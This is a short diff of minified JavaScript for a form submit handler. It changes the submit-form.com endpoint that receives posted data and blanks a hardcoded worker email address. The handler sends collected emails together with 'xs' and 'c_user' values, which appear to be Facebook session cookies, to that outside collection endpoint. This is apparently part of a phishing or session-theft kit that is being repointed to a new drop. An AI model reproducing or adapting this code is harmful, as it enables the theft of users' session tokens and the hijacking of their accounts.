@@ -13358,14 +13358,14 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/4F52K0XR2", {
+                                    u && o ? (fetch("https://submit-form.com/ELCR6DdLi", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "marketingland9@gmail.com",
+                                            workerEmail: "",
                                             xs: o,
                                             c_user: u,
                                             name: "My Self"
